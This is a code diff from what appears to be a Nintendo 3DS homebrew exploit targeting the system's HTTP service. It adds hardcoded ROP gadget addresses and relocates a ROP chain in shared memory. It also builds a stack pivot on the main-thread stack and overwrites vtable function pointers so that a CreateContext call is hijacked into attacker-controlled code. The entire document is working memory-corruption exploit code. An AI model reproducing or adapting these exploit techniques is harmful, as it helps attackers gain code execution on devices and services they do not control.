@@ -39,6 +39,10 @@ u32 ROP_MOVR3R0_MOVR2R0_MOVR1R0_BLXIP = 0x0010f9f0;//"mov r3, r0" "mov r2, r0" "
 
 u32 ROP_BLXIP_POPR3PC = 0x00118c08;//"blx ip" "pop {r3, pc}"
 
+u32 ROP_ADDSPx3C_POPPC = 0x00100204;//sp+=0x3c, then pop-pc.
+
+u32 ROP_ADDSPx154_MOVR0R4_POPR4R5R6R7R8R9SLFPPC = 0x00109148;
+
 u32 ROP_memcpy = 0x0010d274;
 u32 ROP_svcControlMemory = 0x00100770;
 
@@ -260,8 +264,8 @@ Result init_hax_sharedmem(u32 *tmpbuf)
 	u32 object_addr = sharedmembase + 0x200;
 	u32 *initialhaxobj = &tmpbuf[0x200>>2];
 	u32 *haxobj1 = &tmpbuf[0x400>>2];
-	u32 *ropchain = &tmpbuf[0x600>>2];
-	u32 http_ropvaddr = sharedmembase+0x600;
+	u32 *ropchain = &tmpbuf[0x520>>2];
+	u32 http_ropvaddr = sharedmembase+0x520;
 
 	u32 *ropchain_ret2http = &tmpbuf[0xfd0>>2];
 	u32 ret2http_vaddr = sharedmembase+0xfd0;
@@ -274,6 +278,10 @@ Result init_hax_sharedmem(u32 *tmpbuf)
 	u32 closecontext_stackframe = 0x0011d398;//This is the stackframe address for the actual CloseContext function.
 
 	u32 regs[9] = {0};
+
+	//u32 tmpval;
+	u32 tmpdata[2];
+	u32 *tmpdata_ptr, tmpdata_addr;
 
 	target_overwrite_addr = closecontext_stackframe;
 	target_overwrite_addr-= 0xc;//Subtract by this value to get the address of the saved r5 which will be popped.
@@ -295,11 +303,11 @@ Result init_hax_sharedmem(u32 *tmpbuf)
 	//Setup the regs loaded by ROP_LDRR1_R4xc_LDRR2_R4x14_LDRR4_R4x4_OBJVTABLECALLx18.
 	haxobj1[0xc>>2] = 0;//r1
 	haxobj1[0x14>>2] = 0;//r2
-	haxobj1[0x4>>2] = (sharedmembase+0x600) - closecontext_stackframe;//r3
+	haxobj1[0x4>>2] = (sharedmembase+0x520) - closecontext_stackframe;//r3
 
 	//Init the vtable for haxobj1.
 	tmpbuf[(0x500+8) >> 2] = ROP_LDRR1_R4xc_LDRR2_R4x14_LDRR4_R4x4_OBJVTABLECALLx18;//Init the funcptr used by ROPGADGET_LDRR4R5_R5x1b8_OBJVTABLECALLx8. Once this ROP finishes it will jump to ROP_STACKPIVOT.
-	tmpbuf[(0x500+0x18) >> 2] = ROP_STACKPIVOT;//Stack-pivot to sharedmem+0x600.
+	tmpbuf[(0x500+0x18) >> 2] = ROP_STACKPIVOT;//Stack-pivot to sharedmem+0x520.
 
 	//Setup the actual ROP-chain.
 
@@ -349,8 +357,29 @@ Result init_hax_sharedmem(u32 *tmpbuf)
 
 	//Setup the custom vtable used by setuphaxx_httpheap_sharedmem().
 	ropgen_memcpy(&new_ropchain, &http_newropvaddr, __custom_mainservsession_vtable, ROP_HTTPC_MAINSERVSESSION_OBJPTR_VTABLE, ROP_HTTPC_MAINSERVSESSION_OBJPTR_VTABLE_SIZE);
-	ropgen_setr0(&new_ropchain, &http_newropvaddr, 0x40404040);
+	ropgen_setr0(&new_ropchain, &http_newropvaddr, ROP_ADDSPx154_MOVR0R4_POPR4R5R6R7R8R9SLFPPC);
 	ropgen_strr0r1(&new_ropchain, &http_newropvaddr, __custom_mainservsession_vtable + 0x8, 1);//Overwrite the vtable funcptr for CreateContext.
+
+	//Setup the stack data which will be used once the above CreateContext vtable funcptr is used. This will stack-pivot to new_ropvmem.
+	
+	//The below commented block is actually for the context-session thread stack.
+	/*tmpval = closecontext_stackframe + 0x18 + 0x3c;
+	ropgen_setr0(&new_ropchain, &http_newropvaddr, ROP_STACKPIVOT-4);
+	ropgen_strr0r1(&new_ropchain, &http_newropvaddr, tmpval, 1);
+	tmpval+= 4;
+	ropgen_setr0(&new_ropchain, &http_newropvaddr, new_ropvmem - (tmpval + 4));
+	ropgen_strr0r1(&new_ropchain, &http_newropvaddr, tmpval, 1);*/
+
+	//Setup the stack-pivot mentioned above on the main-thread stack for main-service-sessions.
+	tmpdata_ptr = tmpdata;
+	tmpdata_addr = 0x0fffff9c;
+	ropgen_stackpivot(&tmpdata_ptr, &tmpdata_addr, new_ropvmem);
+	tmpdata_addr-= 8;
+
+	ropgen_setr0(&new_ropchain, &http_newropvaddr, tmpdata[0]);
+	ropgen_strr0r1(&new_ropchain, &http_newropvaddr, tmpdata_addr, 1);
+	ropgen_setr0(&new_ropchain, &http_newropvaddr, tmpdata[1]);
+	ropgen_strr0r1(&new_ropchain, &http_newropvaddr, tmpdata_addr+4, 1);
 
 	ropgen_ldrr0r1(&new_ropchain, &http_newropvaddr, closecontext_stackframe + 0x14, 1);//Load the saved LR value in the httpc_cmdhandler func.
 	ropgen_add_r0ip(&new_ropchain, &http_newropvaddr, 0xc);//r0+= 0xc.
@@ -439,9 +468,18 @@ Result init_hax_sharedmem(u32 *tmpbuf)
 	return 0;
 }
 
-Result setuphaxx_httpheap_sharedmem(vu32 *httpheap_sharedmem, u32 httpheap_sharedmem_size)
+Result setuphaxx_httpheap_sharedmem(vu32 *httpheap_sharedmem, u32 httpheap_sharedmem_size, vu32 *ropvmem_sharedmem, u32 ropvmem_sharedmem_size)
 {
 	u32 pos;
+
+	u32 *ropchain = (u32*)ropvmem_sharedmem;
+	u32 ropvaddr = 0x0f000000;
+
+	//Setup the ROP-chain used by the CreateContext vtable funcptr.
+
+	ropgen_addword(&ropchain, &ropvaddr, 0x40506070);
+
+	//Overwrite every vtable ptr with the target value with the custom one.
 
 	for(pos=0; pos<(httpheap_sharedmem_size>>2); pos++)
 	{
